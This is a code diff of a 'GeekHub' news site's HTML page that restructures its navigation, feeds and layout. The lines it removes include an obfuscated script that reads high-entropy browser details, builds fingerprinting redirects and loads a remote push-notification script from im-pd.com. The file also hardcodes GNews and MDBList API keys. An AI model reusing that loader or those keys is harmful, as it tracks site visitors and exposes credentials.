@@ -21,30 +21,11 @@
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-SWGRMPJNRW');
 </script>
 
-<script>
-    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
-    var s = document.createElement('script');
-    s.src='//im-pd.com/49c/4b808/mw.min.js?z=11016452'+'&sw=/sw-check-permissions-4bb5e.js';
-    s.onload = function(result) {
-        switch (result) {
-            case 'onPermissionDefault':break;
-            case 'onPermissionAllowed':break;
-            case 'onPermissionDenied':break;
-            case 'onAlreadySubscribed':break;
-            case 'onNotificationUnsupported':break;
-        }
-    };
-    document.head.appendChild(s);
-</script>
-
-
 <script src="https://jsc.adskeeper.com/site/1096050.js" async>
 </script>
-
 
 <style>
 body{
@@ -93,108 +74,8 @@ nav a{color:white;margin-left:15px;text-decoration:none;cursor:pointer;}
 .article-card h3{padding:10px;margin:0;font-size:18px;}
 .article-card p{padding:0 10px 10px;margin:0;font-size:13px;color:gray;}
 
-#articlePage{
-  display:none;
-  padding:20px;
-}
-
-/* =========================
-   FIXED ARTICLE LAYOUT (IMPORTANT PART)
-========================= */
-.article-layout{
-  display:flex;
-  gap:30px;
-  max-width:1200px;
-  margin:0 auto;
-  align-items:flex-start;
-}
-
-/* MAIN ARTICLE */
-.article-main{
-  flex:3;
-  background:white;
-  padding:25px;
-  border-radius:12px;
-
-  max-width:750px;
-  width:100%;
-
-  box-shadow:0 5px 20px rgba(0,0,0,0.05);
-}
-
-/* ARTICLE CONTENT IMPROVEMENT */
-.article-main h1{
-  font-size:30px;
-  line-height:1.3;
-  margin-bottom:10px;
-}
-
-.article-main p,
-.article-main div{
-  line-height:1.8;
-  font-size:17px;
-  color:#222;
-}
-
-/* IMAGE FIX */
-.article-main img{
-  width:100%;
-  max-height:420px;
-  object-fit:cover;
-  border-radius:12px;
-  margin:20px 0;
-}
-
-/* SIDEBAR FIX */
-.article-side{
-  flex:1;
-  background:white;
-  padding:15px;
-  border-radius:12px;
-
-  position:sticky;
-  top:20px;
-
-  height:fit-content;
-  min-width:260px;
-
-  box-shadow:0 5px 20px rgba(0,0,0,0.05);
-}
-
-.side-item{display:flex;gap:10px;margin-bottom:10px;cursor:pointer;}
-.side-item img{width:80px;height:60px;object-fit:cover;border-radius:6px;}
-.side-item span{font-size:14px;}
-
-.back{
-  background:black;
-  color:white;
-  border:none;
-  padding:10px 15px;
-  margin-bottom:15px;
-  cursor:pointer;
-}
-
-.actions button{
-  padding:8px 15px;
-  margin-right:10px;
-  cursor:pointer;
-}
-
-.comment{
-  background:white;
-  padding:10px;
-  margin-bottom:10px;
-  border-radius:6px;
-}
-
-/* =========================
-   MOBILE FIX (CLEAN)
-========================= */
 @media (max-width: 768px){
-
-  body{
-    font-size:16px;
-  }
+  body{font-size:16px;}
 
   header{
     flex-direction:column;
@@ -202,105 +83,25 @@ nav a{color:white;margin-left:15px;text-decoration:none;cursor:pointer;}
     gap:10px;
   }
 
-  nav{
-    display:flex;
-    flex-wrap:wrap;
-    gap:10px;
-  }
+  nav{display:flex;flex-wrap:wrap;gap:10px;}
+  nav a{margin:0;font-size:14px;}
 
-  nav a{
-    margin:0;
-    font-size:14px;
-  }
+  .main-layout{flex-direction:column;padding:10px;}
+  .hero img{height:220px;}
+  .hero h2{font-size:18px;}
+  .sidebar{margin-top:10px;}
 
-  .main-layout{
-    flex-direction:column;
-    padding:10px;
-  }
+  #articles{grid-template-columns:1fr;padding:10px;}
+  .article-card img{height:160px;}
+  .article-card h3{font-size:16px;}
 
-  .hero img{
-    height:220px;
-  }
-
-  .hero h2{
-    font-size:18px;
-  }
-
-  .sidebar{
-    margin-top:10px;
-  }
-
-  #articles{
-    grid-template-columns:1fr;
-    padding:10px;
-  }
-
-  .article-card img{
-    height:160px;
-  }
-
-  .article-card h3{
-    font-size:16px;
-  }
-
-  /* ARTICLE FIX MOBILE */
-  .article-layout{
-    flex-direction:column;
-    padding:10px;
-  }
-
-  .article-main{
-    max-width:100%;
-    padding:15px;
-  }
-
-  .article-side{
-    position:static;
-    margin-top:20px;
-  }
-
-  .side-item img{
-    width:70px;
-    height:50px;
-  }
-
-  .side-item span{
-    font-size:13px;
-  }
-
-  .actions button{
-    margin-bottom:8px;
-    width:100%;
-  }
-
-  textarea{
-    width:100%;
-    min-height:80px;
-  }
-
-  footer{
-    font-size:12px;
-    padding:15px;
-  }
+  footer{font-size:12px;padding:15px;}
 }
 
 @media (max-width: 480px){
-
-  .logo{
-    font-size:21px;
-  }
-
-  .hero img{
-    height:180px;
-  }
-
-  .hero h2{
-    font-size:16px;
-  }
-
-  .article-main h1{
-    font-size:20px;
-  }
+  .logo{font-size:21px;}
+  .hero img{height:180px;}
+  .hero h2{font-size:16px;}
 }
 
 footer{
@@ -310,36 +111,6 @@ footer{
   background:#111;
   color:white;
   font-size:14px;
-}
-
-#likeNudge{
-  position:fixed;
-  bottom:80px;
-  right:20px;
-  background:#ff4d6d;
-  color:white;
-  padding:12px 18px;
-  border-radius:30px;
-  font-size:14px;
-  font-weight:600;
-  box-shadow:0 5px 15px rgba(0,0,0,0.2);
-  opacity:0;
-  transform:translateY(20px);
-  transition:0.4s ease;
-  z-index:999;
-  cursor:pointer;
-  animation:pulse 2s infinite;
-}
-
-#likeNudge.show{
-  opacity:1;
-  transform:translateY(0);
-}
-
-@keyframes pulse{
-  0%{transform:scale(1);}
-  50%{transform:scale(1.08);}
-  100%{transform:scale(1);}
 }
 
 /* =========================
@@ -424,6 +195,41 @@ footer{
 @media (max-width: 768px){
   .tech-card{flex-basis:200px;}
 }
+
+/* =========================
+   VIDEO SPOTLIGHT (YouTube)
+========================= */
+#videoSpotlight{
+  padding:20px;
+  margin-top:-5px;
+}
+
+#videoSpotlight h3{
+  font-size:15px;
+  color:#666;
+  margin:0 0 10px;
+  text-transform:uppercase;
+  letter-spacing:0.5px;
+}
+
+.video-frame{
+  position:relative;
+  width:100%;
+  max-width:800px;
+  aspect-ratio:16/9;
+  border-radius:10px;
+  overflow:hidden;
+  box-shadow:0 2px 10px rgba(0,0,0,0.06);
+}
+
+.video-frame iframe{
+  position:absolute;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  border:0;
+}
 </style>
 </head>
 
@@ -433,7 +239,6 @@ footer{
 </div>
 <script>(function(w,q){w[q]=w[q]||[];w[q].push(["_mgc.load"])})(window,"_mgq");
 </script>
-
 
 <header>
 <div class="logo" onclick="goHome()">GeekHub</div>
@@ -446,8 +251,6 @@ footer{
 <a onclick="showCategory('sports')">Sports</a>
 <a onclick="showCategory('pop')">Pop Culture</a>
 <a onclick="showTechNews()">🌐 Tech News</a>
-<a onclick="showMovies()">🎬 Trending Movies</a>
-<a onclick="showSportsScores()">🏆 Sports News</a>
 </nav>
 </header>
 
@@ -458,40 +261,29 @@ footer{
 
 <div id="techStrip"></div>
 
+<div id="videoSpotlight">
+  <h3>📺 Video Spotlight</h3>
+  <div class="video-frame">
+    <!--
+      Placeholder video — swap VIDEO_ID_HERE for whatever you want featured today.
+      Grab the ID from the YouTube URL: youtube.com/watch?v=THIS_PART
+      Currently set to a well-known placeholder clip so the layout is visible;
+      replace it with your own pick before going live.
+    -->
+    <iframe
+      src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ"
+      title="Video Spotlight"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
+    </iframe>
+  </div>
+</div>
+
 <div id="articles"></div>
 
-<section id="articlePage">
-<div class="article-layout">
-
-<div class="article-main">
-<button class="back" onclick="goHome()">⬅ Back</button>
-
-<div id="articleContent"></div>
-
-<div class="actions">
-<button onclick="likeArticle()">👍 Like <span id="likeCount">0</span></button>
-<button onclick="favArticle()">⭐ Favourite</button>
-</div>
-
-<h3>Comments</h3>
-<div id="comments"></div>
-
-<textarea id="commentText" placeholder="Write comment..."></textarea>
-<button onclick="addComment()">Post Comment</button>
-
-<button onclick="openEdit()">✏️ Edit</button>
-</div>
-
-<div class="article-side" id="articleSide"></div>
-
-</div>
-</section>
-<div id="likeNudge">
-  ❤️ Enjoying this? Tap Like!
-</div>
 <footer>
   © 2026 GeekHub | Anime • Gaming • Movies • News
-  
+
   <nav>
     <a href="index.html">Home</a><br>
     <a href="about.html">About</a><br>
@@ -501,14 +293,10 @@ footer{
 </footer>
 
 <script>
-let currentArticle=null;
 const API = window.location.origin;
 
 /* =========================
-   GNEWS-POWERED FEEDS (Tech / Movie / Sports news)
-   All three reuse the one GNews key — no extra signups needed.
-   Free plan: 100 req/day, 10/min — cached client-side so normal
-   traffic never gets close to that.
+   GNEWS-POWERED TECH FEED
 ========================= */
 const GNEWS_API_KEY = "0b41d82ebdb09181c35a521e452f4855";
 const GNEWS_CACHE_MINUTES = 1440; // refresh once per 24 hours
@@ -518,14 +306,14 @@ function gnewsURL(category){
 }
 
 async function loadGNewsCategory(category){
-  const cacheKey = `geekhub_gnews_${category}`;
+  const cacheKey = `geekhub_gnews_v2_${category}`;
 
   try{
     const cachedRaw = localStorage.getItem(cacheKey);
     if(cachedRaw){
       const cached = JSON.parse(cachedRaw);
       const ageMinutes = (Date.now() - cached.timestamp) / 60000;
-      if(ageMinutes < GNEWS_CACHE_MINUTES && Array.isArray(cached.articles)){
+      if(ageMinutes < GNEWS_CACHE_MINUTES && Array.isArray(cached.articles) && cached.articles.length > 0){
         return cached.articles;
       }
     }
@@ -536,12 +324,16 @@ async function loadGNewsCategory(category){
     const data = await res.json();
     const articles = Array.isArray(data.articles) ? data.articles : [];
 
-    try{
-      localStorage.setItem(cacheKey, JSON.stringify({
-        timestamp: Date.now(),
-        articles
-      }));
-    }catch(e){ /* storage full/unavailable, skip caching */ }
+    if(res.ok && articles.length > 0){
+      try{
+        localStorage.setItem(cacheKey, JSON.stringify({
+          timestamp: Date.now(),
+          articles
+        }));
+      }catch(e){ /* storage full/unavailable, skip caching */ }
+    }else{
+      console.error(`GNews returned no usable articles (${category})`, data);
+    }
 
     return articles;
   }catch(e){
@@ -597,7 +389,7 @@ async function renderTechStrip(){
 async function showFeed(category, badge, emptyMessage){
   document.getElementById("homeLayout").style.display = "none";
   document.getElementById("techStrip").innerHTML = "";
-  document.getElementById("articlePage").style.display = "none";
+  document.getElementById("videoSpotlight").style.display = "none";
   document.getElementById("articles").style.display = "grid";
 
   const news = await loadGNewsCategory(category);
@@ -615,89 +407,15 @@ function showTechNews(){
   return showFeed("technology", "🌐 LIVE", "Couldn't load tech news right now — try again shortly.");
 }
 
-function showSportsScores(){
-  return showFeed("sports", "🏆 SPORTS", "Couldn't load sports news right now — try again shortly.");
-}
-
 /* =========================
-   TRENDING MOVIES (MDBList)
-   Pulls MDBList's public "Top Watched Movies of the Week" list.
-   Get your own key any time: mdblist.com/preferences
+   ARTICLE NAVIGATION
+   Articles now open on their own page (read.html) instead of
+   swapping content in-place here.
 ========================= */
-const MDBLIST_API_KEY = "x7tvh3k7fyfskdyrzkytmu63a";
-const MDBLIST_URL = `https://mdblist.com/lists/linaspurinis/top-watched-movies-of-the-week/json?apikey=${MDBLIST_API_KEY}`;
-const MDBLIST_CACHE_KEY = "geekhub_mdblist_cache";
-const MDBLIST_CACHE_MINUTES = 1440; // refresh once per 24 hours
-
-async function loadMovies(){
-  try{
-    const cachedRaw = localStorage.getItem(MDBLIST_CACHE_KEY);
-    if(cachedRaw){
-      const cached = JSON.parse(cachedRaw);
-      const ageMinutes = (Date.now() - cached.timestamp) / 60000;
-      if(ageMinutes < MDBLIST_CACHE_MINUTES && Array.isArray(cached.movies)){
-        return cached.movies;
-      }
-    }
-  }catch(e){ /* ignore bad cache */ }
-
-  try{
-    const res = await fetch(MDBLIST_URL);
-    const data = await res.json();
-    const movies = Array.isArray(data) ? data : [];
-
-    try{
-      localStorage.setItem(MDBLIST_CACHE_KEY, JSON.stringify({
-        timestamp: Date.now(),
-        movies
-      }));
-    }catch(e){ /* storage full/unavailable, skip caching */ }
-
-    return movies;
-  }catch(e){
-    console.error("MDBList fetch failed", e);
-    return [];
-  }
+function openArticle(id){
+  window.location.href = "read.html?id=" + id;
 }
 
-async function showMovies(){
-  document.getElementById("homeLayout").style.display = "none";
-  document.getElementById("techStrip").innerHTML = "";
-  document.getElementById("articlePage").style.display = "none";
-  document.getElementById("articles").style.display = "grid";
-
-  const container = document.getElementById("articles");
-  const movies = await loadMovies();
-
-  if(!movies.length){
-    container.innerHTML = `<div class="tech-card empty">Couldn't load movies right now — try again shortly.</div>`;
-    return;
-  }
-
-  container.innerHTML = movies.map(m => {
-    // MDBList list fields can vary slightly by list — fall back gracefully.
-    const title = m.title || m.name || "Untitled";
-    const year = m.year || m.release_year || "";
-    const poster = m.poster || m.poster_path || m.image || "";
-    const rating = m.imdbrating || m.rating || m.score || null;
-    const imdbId = m.imdb_id || m.imdbid || m.i || "";
-    const link = imdbId ? `https://www.imdb.com/title/${imdbId}/` : "#";
-
-    return `
-      <div class="article-card" onclick="window.open('${link}','_blank')" style="position:relative">
-        <span class="tech-badge">🎬 TOP THIS WEEK</span>
-        ${poster ? `<img src="${poster}" onerror="this.style.display='none'">` : ""}
-        <h3>${title}</h3>
-        <small style="padding:0 10px;display:block;color:gray;padding-bottom:10px;">${rating ? "⭐ " + rating + " • " : ""}${year}</small>
-      </div>
-    `;
-  }).join("");
-}
-
-
-/* =========================
-   FORMAT DATE
-========================= */
 function formatDate(date){
   if(!date) return "";
   const d=new Date(date);
@@ -705,37 +423,19 @@ function formatDate(date){
 }
 
 function showCategory(category){
-
   loadArticles().then(dbArticles => {
-
-    const allArticles = dbArticles;
-
-    const filtered = allArticles.filter(article =>
+    const filtered = dbArticles.filter(article =>
       article.category &&
       article.category.toLowerCase() === category.toLowerCase()
     );
 
     document.getElementById("homeLayout").style.display = "none";
     document.getElementById("techStrip").innerHTML = "";
-    document.getElementById("articlePage").style.display = "none";
+    document.getElementById("videoSpotlight").style.display = "none";
     document.getElementById("articles").style.display = "grid";
 
     renderArticles(filtered);
   });
-
-}
-
-/* =========================
-   URL HANDLING
-========================= */
-function setURL(article, replace=false){
-  const url = article && article._id ? `/article/${article._id}` : `/`;
-
-  if(replace){
-    history.replaceState({}, "", url);
-  }else{
-    history.pushState({}, "", url);
-  }
 }
 
 /* =========================
@@ -762,7 +462,7 @@ function buildHome(data){
     <h2>${sorted[0].title}</h2>
   `;
 
-  document.getElementById("hero").onclick=()=>openArticle(sorted[0]);
+  document.getElementById("hero").onclick=()=>openArticle(sorted[0]._id);
 
   const side=document.getElementById("sidebar");
   side.innerHTML="<h3>Trending</h3>";
@@ -770,7 +470,8 @@ function buildHome(data){
   sorted.slice(0,5).forEach(a=>{
     const div=document.createElement("div");
     div.innerHTML="🔥 "+a.title;
-    div.onclick=()=>openArticle(a);
+    div.style.cursor="pointer";
+    div.onclick=()=>openArticle(a._id);
     side.appendChild(div);
   });
 }
@@ -802,267 +503,48 @@ function renderArticles(list){
     meta.innerText=`By ${a.author||"GeekHub"} • ${formatDate(a.date)}`;
     card.appendChild(meta);
 
-    card.onclick=()=>openArticle(a);
+    card.onclick=()=>openArticle(a._id);
     container.appendChild(card);
   });
-}
-
-/* =========================
-   OPEN ARTICLE
-========================= */
-function openArticle(article){
-  currentArticle=article;
-  setURL(article);
-
-  document.getElementById("homeLayout").style.display="none";
-  document.getElementById("techStrip").innerHTML="";
-  document.getElementById("articles").style.display="none";
-  document.getElementById("articlePage").style.display="block";
-
-  document.getElementById("articleContent").innerHTML=`
-    <h1>${article.title}</h1>
-    <p style="color:gray">By ${article.author||"GeekHub"} • ${formatDate(article.date)}</p>
-    <img src="${article.image||''}" style="width:100%">
-    <div>${article.content}</div>
-  `;
-
-  document.getElementById("likeCount").innerText=article.likes||0;
-
-  loadComments();
-
-  loadArticles().then(data=>{
-    const side=document.getElementById("articleSide");
-    side.innerHTML="<h3>More in this category</h3>";
-
-    data
-    .filter(a =>
-  a.category === article.category &&
-  (a._id ? a._id !== article._id : true)
-)
-      .slice(0,5)
-      .forEach(a=>{
-        const div=document.createElement("div");
-        div.className="side-item";
-        div.innerHTML=`<img src="${a.image||''}"><span>${a.title}</span>`;
-        div.onclick=()=>openArticle(a);
-        side.appendChild(div);
-      });
-  });
-
-  // ✅ TRIGGER ANIMATION
-  showLikeNudge();
 }
 
 /* =========================
    NAVIGATION
 ========================= */
 function goHome(){
-  setURL(null);
-  document.getElementById("articlePage").style.display="none";
   document.getElementById("homeLayout").style.display="flex";
+  document.getElementById("videoSpotlight").style.display="block";
   document.getElementById("articles").style.display="grid";
   showHome();
 }
-
-window.onpopstate = () => {
-  const path = window.location.pathname;
-
-  if(path.startsWith("/article/")){
-    const id = path.split("/article/")[1];
-
-    fetch(`${API}/articles/${id}`)
-      .then(r=>r.json())
-      .then(article=>{
-        if(article && article._id){
-          openArticle(article);
-        }
-      });
-  } else {
-    goHome();
-  }
-};
 
 /* =========================
    LOAD DATA
 ========================= */
 async function showHome(){
-
   const dbArticles = await loadArticles();
-
   renderArticles(dbArticles);
   renderTechStrip();
 }
 
-
 /* =========================
-   COMMENTS
+   STARTUP
+   Supports deep links from read.html's nav: index.html?cat=X
+   or index.html?feed=technology
 ========================= */
-function loadComments(){
-  const box=document.getElementById("comments");
-  box.innerHTML="";
-  (currentArticle.comments||[]).forEach(c=>{
-    const d=document.createElement("div");
-    d.className="comment";
-    d.innerText=c;
-    box.appendChild(d);
-  });
-}
+(function startup(){
+  const params = new URLSearchParams(window.location.search);
+  const cat = params.get("cat");
+  const feed = params.get("feed");
 
-/* =========================
-   LIKE SYSTEM
-========================= */
-async function likeArticle(){
-
-  if(!currentArticle) return;
-
-  if(!currentArticle._id){
-    alert("Likes only work on GeekHub articles.");
-    return;
+  if(feed === "technology"){
+    showTechNews();
+  }else if(cat){
+    showCategory(cat);
+  }else{
+    showHome();
   }
-
-  await fetch(
-    `${API}/articles/${currentArticle._id}/like`,
-    {method:"POST"}
-  );
-
-  currentArticle.likes =
-    (currentArticle.likes || 0) + 1;
-
-  document.getElementById("likeCount").innerText =
-    currentArticle.likes;
-}
-
-/* =========================
-   COMMENTS POST
-========================= */
-async function addComment(){
-
-  const t =
-    document.getElementById("commentText").value;
-
-  if(!t) return;
-
-  if(!currentArticle._id){
-    alert("Comments only work on GeekHub articles.");
-    return;
-  }
-
-  await fetch(
-    `${API}/articles/${currentArticle._id}/comment`,
-    {
-      method:"POST",
-      headers:{
-        "Content-Type":"application/json"
-      },
-      body:JSON.stringify({
-        comment:t
-      })
-    }
-  );
-
-  if(!currentArticle.comments)
-    currentArticle.comments = [];
-
-  currentArticle.comments.push(t);
-
-  document.getElementById("commentText").value = "";
-
-  loadComments();
-}
-
-/* =========================
-   OTHER ACTIONS
-========================= */
-function favArticle(){
-  alert("Saved to favourites (you can connect backend later)");
-}
-
-function openEdit(){
-  const key=prompt("Enter admin key:");
-  if(!key) return;
-
-  // The key is no longer checked here — the server verifies it on save,
-  // so there's nothing meaningful to bypass by reading this file.
-  sessionStorage.setItem("adminKey", key);
-  localStorage.setItem("editArticle",JSON.stringify(currentArticle));
-  window.location.href="/write.html";
-}
-
-/* =========================
-   DIRECT LINK CHECK
-========================= */
-checkDirectLink();
-
-function checkDirectLink(){
-  const path=window.location.pathname;
-
-  if(path.startsWith("/article/")){
-    const id=path.split("/article/")[1];
-
-    fetch(`${API}/articles/${id}`)
-      .then(r=>r.json())
-      .then(article=>{
-        if(article && article._id){
-          openArticle(article);
-        }else showHome();
-      });
-  }else showHome();
-}
-
-let nudgeReady = false;
-let nudge = null;
-
-let showTimer = null;
-let autoHideTimer = null;
-
-function showLikeNudge(){
-  nudge = document.getElementById("likeNudge");
-  if(!nudge) return;
-
-  // CLEAR OLD TIMERS (important fix)
-  clearTimeout(showTimer);
-  clearTimeout(autoHideTimer);
-
-  // reset state
-  nudge.classList.remove("show");
-  nudgeReady = false;
-
-  // show after 4 seconds
-  showTimer = setTimeout(() => {
-    nudge.classList.add("show");
-    nudgeReady = true;
-
-    // AUTO HIDE AFTER 3 MINUTES
-    autoHideTimer = setTimeout(() => {
-      nudge.classList.remove("show");
-      nudgeReady = false;
-    }, 180000);
-
-  }, 4000);
-}
-
-/* CLICK HANDLER */
-document.addEventListener("DOMContentLoaded", () => {
-  const el = document.getElementById("likeNudge");
-  if(!el) return;
-
-  el.onclick = () => {
-    if(!nudgeReady) return;
-
-    likeArticle();
-
-    el.innerHTML = "🔥 Thanks for the support!";
-    el.style.background = "#28a745";
-
-    nudgeReady = false;
-
-    clearTimeout(autoHideTimer);
-
-    setTimeout(() => {
-      el.classList.remove("show");
-    }, 1200);
-  };
-});
+})();
 </script>
 
 </body>
